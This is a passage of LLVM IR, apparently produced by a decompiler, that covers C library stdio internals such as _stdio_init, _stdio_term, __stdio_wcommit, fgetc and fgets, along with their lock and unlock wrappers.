  %v1_805482b = add i32 %v0_805482b, -1
  %v9_805482b = icmp eq i32 %v1_805482b, 0
  store i32 %v1_805482b, i32* @global_var_8058304.339, align 4
  %v1_8054833 = icmp eq i1 %v9_805482b, false
  call void @__pseudo_cond_branch(i1 %v1_8054833, i32 134563949)
  ret i32 %v1_805480d

; uselistorder directives
  uselistorder i32 %v1_805482b, { 1, 0 }
}

define i32 @function_8054835() local_unnamed_addr {
dec_label_pc_8054835:
  %v0_8054835 = call i32 @function_8054839()
  ret i32 %v0_8054835

; uselistorder directives
  uselistorder i32 ()* @function_8054839, { 1, 0 }
}

define i32 @function_8054839() local_unnamed_addr {
dec_label_pc_8054839:
  %v0_8054839 = load i32, i32* @ebx, align 4
  ret i32 %v0_8054839
}

define i32 @_L_lock_198() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @ecx, align 4
  %v0_8054846 = call i32 @__lll_lock_wait_private()
  %v0_805484b = call i32 @function_805478e()
  ret i32 %v0_805484b
}

define i32 @_L_lock_209() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @ecx, align 4
  %v0_8054856 = call i32 @__lll_lock_wait_private()
  %v0_805485b = call i32 @function_80547c1()
  ret i32 %v0_805485b
}

define i32 @_L_unlock_225() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_80582f8.319 to i32), i32* @eax, align 4
  %v0_8054866 = call i32 @__lll_unlock_wake_private()
  %v0_805486b = call i32 @function_8054808()
  ret i32 %v0_805486b
}

define i32 @_L_unlock_235() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @eax, align 4
  %v0_8054873 = call i32 @__lll_unlock_wake_private()
  %v0_8054878 = call i32 @function_8054835()
  ret i32 %v0_8054878
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805487c = load i32, i32* @esi, align 4
  store i32 -8, i32* @esi, align 4
  %v0_8054883 = load i32, i32* @ebx, align 4
  store i32 %v0_8054883, i32* %stack_var_-8, align 4
  %v2_8054884 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_8054884, i32* @ebx, align 4
  %v1_8054889 = call i32 @isatty(i32 0)
  %v1_805488f = icmp eq i32 %v1_8054889, 0
  %v1_8054891 = icmp eq i1 %v1_805488f, false
  br i1 %v1_8054891, label %dec_label_pc_805489c, label %dec_label_pc_8054893

dec_label_pc_8054893:                             ; preds = %entry
  %v0_8054893 = load i16, i16* @global_var_8057c20.308, align 32
  %v1_8054893 = xor i16 %v0_8054893, 256
  store i16 %v1_8054893, i16* @global_var_8057c20.308, align 32
  br label %dec_label_pc_805489c

dec_label_pc_805489c:                             ; preds = %entry, %dec_label_pc_8054893
  %v1_805489e = call i32 @isatty(i32 1)
  %v1_80548a4 = icmp eq i32 %v1_805489e, 0
  %v1_80548a6 = icmp eq i1 %v1_80548a4, false
  br i1 %v1_80548a6, label %dec_label_pc_80548b1, label %dec_label_pc_80548a8

dec_label_pc_80548a8:                             ; preds = %dec_label_pc_805489c
  %v0_80548a8 = load i16, i16* @global_var_8057c64.309, align 4
  %v1_80548a8 = xor i16 %v0_80548a8, 256
  store i16 %v1_80548a8, i16* @global_var_8057c64.309, align 4
  br label %dec_label_pc_80548b1

dec_label_pc_80548b1:                             ; preds = %dec_label_pc_805489c, %dec_label_pc_80548a8
  %v0_80548b1 = load i32, i32* @ebx, align 4
  %v1_80548b1 = load i32, i32* @esi, align 4
  %v2_80548b1 = inttoptr i32 %v1_80548b1 to i32*
  store i32 %v0_80548b1, i32* %v2_80548b1, align 4
  %v2_80548b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80548b4, i32* @ebx, align 4
  store i32 %v0_805487c, i32* @esi, align 4
  ret i32 %v1_805489e

; uselistorder directives
  uselistorder i16* @global_var_8057c64.309, { 1, 0 }
  uselistorder i16 256, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80548b1, { 1, 0 }
  uselistorder label %dec_label_pc_805489c, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80548b7 = load i32, i32* @ebx, align 4
  store i32 %v0_80548b7, i32* %stack_var_-4, align 4
  %v0_80548b8 = load i32, i32* bitcast (i32** @global_var_8057c18.322 to i32*), align 8
  store i32 %v0_80548b8, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @global_var_8058300.317, align 256
  store i32 0, i32* @global_var_80582fc.320, align 4
  store i32 0, i32* @global_var_80582f8.319, align 8
  store i32 0, i32* @global_var_805830c.337, align 4
  store i32 0, i32* @global_var_8058308.341, align 8
  store i32 0, i32* @global_var_8058304.339, align 4
  %v0_80548fa = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_80548fa, i32* %ebx.global-to-local, align 4
  %v1_80549667 = icmp eq i32 %v0_80548b8, 0
  %v1_80549689 = icmp eq i1 %v1_80549667, false
  br i1 %v1_80549689, label %dec_label_pc_8054903, label %dec_label_pc_8054981.preheader

dec_label_pc_8054903:                             ; preds = %entry, %dec_label_pc_8054947.dec_label_pc_8054903_crit_edge
  %v4_8054903 = phi i32 [ %v4_8054903.pre, %dec_label_pc_8054947.dec_label_pc_8054903_crit_edge ], [ %v0_80548fa, %entry ]
  %v17_805492e = phi i32 [ %v3_8054963, %dec_label_pc_8054947.dec_label_pc_8054903_crit_edge ], [ %v0_80548b8, %entry ]
  %v1_8054903 = add i32 %v17_805492e, 64
  %v2_8054903 = inttoptr i32 %v1_8054903 to i32*
  %v3_8054903 = load i32, i32* %v2_8054903, align 4
  %v15_8054903 = icmp eq i32 %v3_8054903, %v4_8054903
  br i1 %v15_8054903, label %dec_label_pc_805492e, label %dec_label_pc_8054908

dec_label_pc_8054908:                             ; preds = %dec_label_pc_8054903
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805490f = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805490f = icmp eq i32 %v0_805490f, 0
  call void @__pseudo_cond_branch(i1 %v1_805490f, i32 134564122)
  %v0_8054919 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054919 = add i32 %v0_8054919, 56
  %v2_8054919 = inttoptr i32 %v1_8054919 to i32*
  %v3_8054919 = load i32, i32* %v2_8054919, align 4
  %v4_8054919 = load i32, i32* %edx.global-to-local, align 4
  %v5_8054919 = load i32, i32* %eax.global-to-local, align 4
  %v16_8054919 = icmp eq i32 %v5_8054919, %v3_8054919
  %v23_8054919 = select i1 %v16_8054919, i32 %v4_8054919, i32 %v3_8054919
  store i32 %v23_8054919, i32* %v2_8054919, align 4
  store i32 %v3_8054919, i32* @eax, align 4
  %v1_805491e = icmp eq i32 %v3_8054919, 0
  %v1_8054920 = icmp eq i1 %v1_805491e, false
  br i1 %v1_8054920, label %dec_label_pc_8054933, label %dec_label_pc_8054922

dec_label_pc_8054922:                             ; preds = %dec_label_pc_8054908
  %v0_8054922 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054922 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054922 = add i32 %v1_8054922, 64
  %v3_8054922 = inttoptr i32 %v2_8054922 to i32*
  store i32 %v0_8054922, i32* %v3_8054922, align 4
  %v0_8054925 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054925 = add i32 %v0_8054925, 60
  %v2_8054925 = inttoptr i32 %v1_8054925 to i32*
  store i32 1, i32* %v2_8054925, align 4
  br label %dec_label_pc_8054947

dec_label_pc_805492e:                             ; preds = %dec_label_pc_8054903
  %v1_805492e = add i32 %v17_805492e, 60
  %v2_805492e = inttoptr i32 %v1_805492e to i32*
  %v3_805492e = load i32, i32* %v2_805492e, align 4
  %v4_805492e = add i32 %v3_805492e, 1
  store i32 %v4_805492e, i32* %v2_805492e, align 4
  br label %dec_label_pc_8054947

dec_label_pc_8054933:                             ; preds = %dec_label_pc_8054908
  %v0_8054933 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054933 = add i32 %v0_8054933, 8
  %v2_8054933 = inttoptr i32 %v1_8054933 to i32*
  %v3_8054933 = load i32, i32* %v2_8054933, align 4
  store i32 %v3_8054933, i32* @eax, align 4
  %v1_8054936 = inttoptr i32 %v0_8054933 to i16*
  store i16 48, i16* %v1_8054936, align 2
  %v0_805493b = load i32, i32* @eax, align 4
  %v1_805493b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805493b = add i32 %v1_805493b, 24
  %v3_805493b = inttoptr i32 %v2_805493b to i32*
  store i32 %v0_805493b, i32* %v3_805493b, align 4
  %v0_805493e = load i32, i32* @eax, align 4
  %v1_805493e = load i32, i32* %ecx.global-to-local, align 4
  %v2_805493e = add i32 %v1_805493e, 28
  %v3_805493e = inttoptr i32 %v2_805493e to i32*
  store i32 %v0_805493e, i32* %v3_805493e, align 4
  %v0_8054941 = load i32, i32* @eax, align 4
  %v1_8054941 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054941 = add i32 %v1_8054941, 16
  %v3_8054941 = inttoptr i32 %v2_8054941 to i32*
  store i32 %v0_8054941, i32* %v3_8054941, align 4
  %v0_8054944 = load i32, i32* @eax, align 4
  %v1_8054944 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054944 = add i32 %v1_8054944, 20
  %v3_8054944 = inttoptr i32 %v2_8054944 to i32*
  store i32 %v0_8054944, i32* %v3_8054944, align 4
  br label %dec_label_pc_8054947

dec_label_pc_8054947:                             ; preds = %dec_label_pc_805492e, %dec_label_pc_8054922, %dec_label_pc_8054933
  %v0_8054947 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054947 = add i32 %v0_8054947, 52
  %v2_8054947 = inttoptr i32 %v1_8054947 to i32*
  store i32 1, i32* %v2_8054947, align 4
  %v0_805494e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805494e = add i32 %v0_805494e, 64
  %v2_805494e = inttoptr i32 %v1_805494e to i32*
  store i32 0, i32* %v2_805494e, align 4
  %v0_8054955 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054955 = add i32 %v0_8054955, 60
  %v2_8054955 = inttoptr i32 %v1_8054955 to i32*
  store i32 0, i32* %v2_8054955, align 4
  %v0_805495c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805495c = add i32 %v0_805495c, 56
  %v2_805495c = inttoptr i32 %v1_805495c to i32*
  store i32 0, i32* %v2_805495c, align 4
  %v0_8054963 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054963 = add i32 %v0_8054963, 32
  %v2_8054963 = inttoptr i32 %v1_8054963 to i32*
  %v3_8054963 = load i32, i32* %v2_8054963, align 4
  store i32 %v3_8054963, i32* %ecx.global-to-local, align 4
  %v1_8054966 = icmp eq i32 %v3_8054963, 0
  %v1_8054968 = icmp eq i1 %v1_8054966, false
  br i1 %v1_8054968, label %dec_label_pc_8054947.dec_label_pc_8054903_crit_edge, label %dec_label_pc_8054966.dec_label_pc_8054981.preheader_crit_edge

dec_label_pc_8054947.dec_label_pc_8054903_crit_edge: ; preds = %dec_label_pc_8054947
  %v4_8054903.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054903

dec_label_pc_8054966.dec_label_pc_8054981.preheader_crit_edge: ; preds = %dec_label_pc_8054947
  %storemerge2.pre = load i32, i32* bitcast (i32** @global_var_8057c18.322 to i32*), align 4
  br label %dec_label_pc_8054981.preheader

dec_label_pc_8054981.preheader:                   ; preds = %dec_label_pc_8054966.dec_label_pc_8054981.preheader_crit_edge, %entry
  %storemerge2 = phi i32 [ %storemerge2.pre, %dec_label_pc_8054966.dec_label_pc_8054981.preheader_crit_edge ], [ %v0_80548b8, %entry ]
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_80549813 = icmp eq i32 %storemerge2, 0
  %v1_80549835 = icmp eq i1 %v1_80549813, false
  br i1 %v1_80549835, label %dec_label_pc_8054972.lr.ph, label %dec_label_pc_8054985

dec_label_pc_8054972.lr.ph:                       ; preds = %dec_label_pc_8054981.preheader
  br label %dec_label_pc_8054972

dec_label_pc_8054972:                             ; preds = %dec_label_pc_8054972.lr.ph, %dec_label_pc_805497e
  %v0_8054977 = phi i32 [ %storemerge2, %dec_label_pc_8054972.lr.ph ], [ %storemerge, %dec_label_pc_805497e ]
  %v1_8054972 = inttoptr i32 %v0_8054977 to i8*
  %v2_8054972 = load i8, i8* %v1_8054972, align 1
  %v3_8054972 = and i8 %v2_8054972, 64
  %v4_8054972 = icmp eq i8 %v3_8054972, 0
  br i1 %v4_8054972, label %dec_label_pc_805497e, label %dec_label_pc_8054977

dec_label_pc_8054977:                             ; preds = %dec_label_pc_8054972
  %v2_8054978 = call i32 @__stdio_wcommit(i32 %v0_8054977)
  store i32 %v0_8054977, i32* @eax, align 4
  %v0_805497e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805497e

dec_label_pc_805497e:                             ; preds = %dec_label_pc_8054972, %dec_label_pc_8054977
  %v0_805497e = phi i32 [ %v0_8054977, %dec_label_pc_8054972 ], [ %v0_805497e.pre, %dec_label_pc_8054977 ]
  %v1_805497e = add i32 %v0_805497e, 32
  %v2_805497e = inttoptr i32 %v1_805497e to i32*
  %storemerge = load i32, i32* %v2_805497e, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_8054981 = icmp eq i32 %storemerge, 0
  %v1_8054983 = icmp eq i1 %v1_8054981, false
  br i1 %v1_8054983, label %dec_label_pc_8054972, label %dec_label_pc_8054985

dec_label_pc_8054985:                             ; preds = %dec_label_pc_805497e, %dec_label_pc_8054981.preheader
  %v2_8054985 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054985, i32* %ebx.global-to-local, align 4
  %v0_8054986 = load i32, i32* @eax, align 4
  ret i32 %v0_8054986

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_8054977, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 0, 2, 1 }
  uselistorder i32 %v3_8054963, { 1, 2, 0 }
  uselistorder i32 %v3_8054919, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80548b8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805497e, { 1, 0 }
  uselistorder label %dec_label_pc_8054972, { 1, 0 }
  uselistorder label %dec_label_pc_8054947, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054903, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054988 = load i32, i32* @ebx, align 4
  store i32 %v0_8054988, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805498d = add i32 %arg1, 8
  %v2_805498d = inttoptr i32 %v1_805498d to i32*
  %v3_805498d = load i32, i32* %v2_805498d, align 4
  store i32 %v3_805498d, i32* %edx.global-to-local, align 4
  %v1_8054990 = add i32 %arg1, 16
  %v2_8054990 = inttoptr i32 %v1_8054990 to i32*
  %v3_8054990 = load i32, i32* %v2_8054990, align 4
  %v2_8054993 = sub i32 %v3_8054990, %v3_805498d
  %v12_8054993 = icmp eq i32 %v2_8054993, 0
  store i32 %v2_8054993, i32* %eax.global-to-local, align 4
  br i1 %v12_8054993, label %dec_label_pc_80549a5, label %dec_label_pc_8054997

dec_label_pc_8054997:                             ; preds = %entry
  store i32 %v3_805498d, i32* %v2_8054990, align 4
  %v0_805499a = load i32, i32* %eax.global-to-local, align 4
  %v0_805499b = load i32, i32* %edx.global-to-local, align 4
  %v0_805499c = load i32, i32* @ebx, align 4
  %v3_805499d = load i32, i32* %stack_var_-4, align 4
  %v4_805499d = inttoptr i32 %v0_805499c to i16*
  %v5_805499d = call i32 @__stdio_WRITE(i16* %v4_805499d, i32 %v0_805499b, i32 %v0_805499a, i32 %v3_805499d)
  store i32 %v5_805499d, i32* %eax.global-to-local, align 4
  %v0_80549a5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80549a5

dec_label_pc_80549a5:                             ; preds = %entry, %dec_label_pc_8054997
  %v2_80549ab = phi i32 [ %v0_8054988, %entry ], [ %v3_805499d, %dec_label_pc_8054997 ]
  %v0_80549a5 = phi i32 [ %arg1, %entry ], [ %v0_80549a5.pre, %dec_label_pc_8054997 ]
  %v1_80549a5 = add i32 %v0_80549a5, 16
  %v2_80549a5 = inttoptr i32 %v1_80549a5 to i32*
  %v3_80549a5 = load i32, i32* %v2_80549a5, align 4
  store i32 %v3_80549a5, i32* %eax.global-to-local, align 4
  %v2_80549a8 = add i32 %v0_80549a5, 8
  %v3_80549a8 = inttoptr i32 %v2_80549a8 to i32*
  %v4_80549a8 = load i32, i32* %v3_80549a8, align 4
  %v5_80549a8 = sub i32 %v3_80549a5, %v4_80549a8
  store i32 %v5_80549a8, i32* %eax.global-to-local, align 4
  store i32 %v2_80549ab, i32* @ebx, align 4
  ret i32 %v5_80549a8

; uselistorder directives
  uselistorder i32 %v0_80549a5, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80549a5, { 1, 0 }
}

define i32 @__GI_fgetc() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80549b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80549b0, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v1_80549b5 = add i32 %tmp, 52
  %v2_80549b5 = inttoptr i32 %v1_80549b5 to i32*
  %v3_80549b5 = load i32, i32* %v2_80549b5, align 4
  %v4_80549b5 = icmp eq i32 %v3_80549b5, 0
  br i1 %v4_80549b5, label %dec_label_pc_80549d6, label %dec_label_pc_80549bb

dec_label_pc_80549bb:                             ; preds = %entry
  %v1_80549bb = add i32 %tmp, 16
  %v2_80549bb = inttoptr i32 %v1_80549bb to i32*
  %v3_80549bb = load i32, i32* %v2_80549bb, align 4
  store i32 %v3_80549bb, i32* %eax.global-to-local, align 4
  %v2_80549be = add i32 %tmp, 24
  %v3_80549be = inttoptr i32 %v2_80549be to i32*
  %v4_80549be = load i32, i32* %v3_80549be, align 4
  %v10_80549be = icmp ult i32 %v3_80549bb, %v4_80549be
  %v1_80549c1 = icmp eq i1 %v10_80549be, false
  br i1 %v1_80549c1, label %dec_label_pc_80549cc, label %dec_label_pc_80549c3

dec_label_pc_80549c3:                             ; preds = %dec_label_pc_80549bb
  %v1_80549c3 = inttoptr i32 %v3_80549bb to i8*
  %v2_80549c3 = load i8, i8* %v1_80549c3, align 1
  %v3_80549c3 = zext i8 %v2_80549c3 to i32
  store i32 %v3_80549c3, i32* @edx, align 4
  %v1_80549c6 = add i32 %v3_80549bb, 1
  store i32 %v1_80549c6, i32* %eax.global-to-local, align 4
  store i32 %v1_80549c6, i32* %v2_80549bb, align 4
  %v0_80549ca = load i32, i32* %stack_var_-4, align 4
  %v1_80549ca = call i32 @function_8054a3d(i32 %v0_80549ca)
  store i32 %v1_80549ca, i32* %eax.global-to-local, align 4
  %v0_80549cc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80549cc

dec_label_pc_80549cc:                             ; preds = %dec_label_pc_80549bb, %dec_label_pc_80549c3
  %v2_80549d0 = phi i32 [ %v0_80549b0, %dec_label_pc_80549bb ], [ %v0_80549ca, %dec_label_pc_80549c3 ]
  %v0_80549cc = phi i32 [ %tmp, %dec_label_pc_80549bb ], [ %v0_80549cc.pre, %dec_label_pc_80549c3 ]
  store i32 %v2_80549d0, i32* @ebx, align 4
  %v1_80549d1 = inttoptr i32 %v0_80549cc to i16*
  %v2_80549d1 = call i32 @getc_unlocked(i16* %v1_80549d1)
  store i32 %v2_80549d1, i32* %eax.global-to-local, align 4
  %v0_80549dd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80549d6

dec_label_pc_80549d6:                             ; preds = %entry, %dec_label_pc_80549cc
  %v0_80549dd = phi i32 [ %tmp, %entry ], [ %v0_80549dd.pre, %dec_label_pc_80549cc ]
  %v0_80549d6 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v1_80549dd = add i32 %v0_80549dd, 64
  %v2_80549dd = inttoptr i32 %v1_80549dd to i32*
  %v3_80549dd = load i32, i32* %v2_80549dd, align 4
  %v15_80549dd = icmp eq i32 %v3_80549dd, %v0_80549d6
  call void @__pseudo_cond_branch(i1 %v15_80549dd, i32 134564349)
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v0_80549e9 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80549e9 = icmp eq i32 %v0_80549e9, 0
  call void @__pseudo_cond_branch(i1 %v1_80549e9, i32 134564340)
  %v0_80549f3 = load i32, i32* @ebx, align 4
  %v1_80549f3 = add i32 %v0_80549f3, 56
  %v2_80549f3 = inttoptr i32 %v1_80549f3 to i32*
  %v3_80549f3 = load i32, i32* %v2_80549f3, align 4
  %v4_80549f3 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80549f3 = load i32, i32* %eax.global-to-local, align 4
  %v16_80549f3 = icmp eq i32 %v5_80549f3, %v3_80549f3
  %v23_80549f3 = select i1 %v16_80549f3, i32 %v4_80549f3, i32 %v3_80549f3
  store i32 %v23_80549f3, i32* %v2_80549f3, align 4
  store i32 %v3_80549f3, i32* %eax.global-to-local, align 4
  %v1_80549f8 = icmp eq i1 %v16_80549f3, false
  call void @__pseudo_cond_branch(i1 %v1_80549f8, i32 134564417)
  ret i32 %v3_80549f3

; uselistorder directives
  uselistorder i1 %v16_80549f3, { 1, 0 }
  uselistorder i32 %v3_80549f3, { 1, 0, 3, 2 }
  uselistorder i32 %v3_80549bb, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_80549d6, { 1, 0 }
  uselistorder label %dec_label_pc_80549cc, { 1, 0 }
}

define i32 @function_80549fa() local_unnamed_addr {
dec_label_pc_80549fa:
  %eax.global-to-local = alloca i32, align 4
  %v0_80549fa = load i32, i32* @edx, align 4
  %v1_80549fa = load i32, i32* @ebx, align 4
  %v2_80549fa = add i32 %v1_80549fa, 64
  %v3_80549fa = inttoptr i32 %v2_80549fa to i32*
  store i32 %v0_80549fa, i32* %v3_80549fa, align 4
  %v0_80549fd = load i32, i32* @ebx, align 4
  %v1_80549fd = add i32 %v0_80549fd, 16
  %v2_80549fd = inttoptr i32 %v1_80549fd to i32*
  %v3_80549fd = load i32, i32* %v2_80549fd, align 4
  store i32 %v3_80549fd, i32* %eax.global-to-local, align 4
  %v1_8054a00 = add i32 %v0_80549fd, 60
  %v2_8054a00 = inttoptr i32 %v1_8054a00 to i32*
  %v3_8054a00 = load i32, i32* %v2_8054a00, align 4
  %v4_8054a00 = add i32 %v3_8054a00, 1
  store i32 %v4_8054a00, i32* %v2_8054a00, align 4
  %v0_8054a03 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054a03 = load i32, i32* @ebx, align 4
  %v2_8054a03 = add i32 %v1_8054a03, 24
  %v3_8054a03 = inttoptr i32 %v2_8054a03 to i32*
  %v4_8054a03 = load i32, i32* %v3_8054a03, align 4
  %v10_8054a03 = icmp ult i32 %v0_8054a03, %v4_8054a03
  %v1_8054a06 = icmp eq i1 %v10_8054a03, false
  br i1 %v1_8054a06, label %dec_label_pc_8054a11, label %dec_label_pc_8054a08

dec_label_pc_8054a08:                             ; preds = %dec_label_pc_80549fa
  %v1_8054a0b = add i32 %v0_8054a03, 1
  store i32 %v1_8054a0b, i32* %eax.global-to-local, align 4
  %v2_8054a0c = add i32 %v1_8054a03, 16
  %v3_8054a0c = inttoptr i32 %v2_8054a0c to i32*
  store i32 %v1_8054a0b, i32* %v3_8054a0c, align 4
  br label %dec_label_pc_8054a1a

dec_label_pc_8054a11:                             ; preds = %dec_label_pc_80549fa
  %v1_8054a12 = inttoptr i32 %v1_8054a03 to i16*
  %v2_8054a12 = call i32 @getc_unlocked(i16* %v1_8054a12)
  store i32 %v1_8054a03, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a1a

dec_label_pc_8054a1a:                             ; preds = %dec_label_pc_8054a08, %dec_label_pc_8054a11
  %v0_8054a1a = load i32, i32* @ebx, align 4
  %v1_8054a1a = add i32 %v0_8054a1a, 60
  %v2_8054a1a = inttoptr i32 %v1_8054a1a to i32*
  %v3_8054a1a = load i32, i32* %v2_8054a1a, align 4
  %v1_8054a1d = add i32 %v3_8054a1a, -1
  %v8_8054a1d = icmp eq i32 %v1_8054a1d, 0
  store i32 %v1_8054a1d, i32* %eax.global-to-local, align 4
  store i32 %v1_8054a1d, i32* %v2_8054a1a, align 4
  %v1_8054a23 = icmp eq i1 %v8_8054a1d, false
  call void @__pseudo_cond_branch(i1 %v1_8054a23, i32 134564413)
  %v0_8054a25 = load i32, i32* @ebx, align 4
  %v1_8054a25 = add i32 %v0_8054a25, 64
  %v2_8054a25 = inttoptr i32 %v1_8054a25 to i32*
  store i32 0, i32* %v2_8054a25, align 4
  %v0_8054a2c = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054a2c = icmp eq i32 %v0_8054a2c, 0
  call void @__pseudo_cond_branch(i1 %v1_8054a2c, i32 134564407)
  %v0_8054a36 = load i32, i32* @ebx, align 4
  %v1_8054a36 = add i32 %v0_8054a36, 56
  %v2_8054a36 = inttoptr i32 %v1_8054a36 to i32*
  %v3_8054a36 = load i32, i32* %v2_8054a36, align 4
  %v4_8054a36 = add i32 %v3_8054a36, -1
  %v12_8054a36 = icmp eq i32 %v4_8054a36, 0
  store i32 %v4_8054a36, i32* %v2_8054a36, align 4
  %v1_8054a3b = icmp eq i1 %v12_8054a36, false
  call void @__pseudo_cond_branch(i1 %v1_8054a3b, i32 134564427)
  ret i32 %v1_8054a1d

; uselistorder directives
  uselistorder i32 %v4_8054a36, { 1, 0 }
  uselistorder i32 %v1_8054a1d, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8054a1a, { 1, 0 }
}

define i32 @function_8054a3d(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054a3d:
  %v0_8054a3d = load i32, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  ret i32 %v0_8054a3d
}

define i32 @_L_lock_32() local_unnamed_addr {
entry:
  %v0_8054a41 = load i32, i32* @ebx, align 4
  %v1_8054a41 = add i32 %v0_8054a41, 56
  store i32 %v1_8054a41, i32* @ecx, align 4
  %v0_8054a44 = call i32 @__lll_lock_wait_private()
  %v0_8054a49 = call i32 @function_80549fa()
  ret i32 %v0_8054a49
}

define i32 @_L_unlock_61() local_unnamed_addr {
entry:
  %v0_8054a4b = load i32, i32* @ebx, align 4
  %v1_8054a4b = add i32 %v0_8054a4b, 56
  store i32 %v1_8054a4b, i32* @eax, align 4
  %v0_8054a4e = call i32 @__lll_unlock_wake_private()
  %v1_8054a53 = call i32 @function_8054a3d(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_8054a53
}

define i32 @fgets() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v1_8054a5e = add i32 %tmp, 52
  %v2_8054a5e = inttoptr i32 %v1_8054a5e to i32*
  %v3_8054a5e = load i32, i32* %v2_8054a5e, align 4
  store i32 %v3_8054a5e, i32* @esi, align 4
  %v1_8054a61 = icmp eq i32 %v3_8054a5e, 0
  %v1_8054a63 = icmp eq i1 %v1_8054a61, false
  call void @__pseudo_cond_branch(i1 %v1_8054a63, i32 134564495)
  %v0_8054a65 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_8054a6c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054a6c = add i32 %v0_8054a6c, 64
  %v2_8054a6c = inttoptr i32 %v1_8054a6c to i32*
  %v3_8054a6c = load i32, i32* %v2_8054a6c, align 4
  %v15_8054a6c = icmp eq i32 %v3_8054a6c, %v0_8054a65
  call void @__pseudo_cond_branch(i1 %v15_8054a6c, i32 134564492)
  store i32 1, i32* %ecx.global-to-local, align 4
  store i32 %v3_8054a5e, i32* %eax.global-to-local, align 4
  %v0_8054a78 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054a78 = icmp eq i32 %v0_8054a78, 0
  call void @__pseudo_cond_branch(i1 %v1_8054a78, i32 134564483)
  %v0_8054a82 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054a82 = add i32 %v0_8054a82, 56
  %v2_8054a82 = inttoptr i32 %v1_8054a82 to i32*
  %v3_8054a82 = load i32, i32* %v2_8054a82, align 4
  %v4_8054a82 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8054a82 = load i32, i32* %eax.global-to-local, align 4
  %v16_8054a82 = icmp eq i32 %v5_8054a82, %v3_8054a82
  %v23_8054a82 = select i1 %v16_8054a82, i32 %v4_8054a82, i32 %v3_8054a82
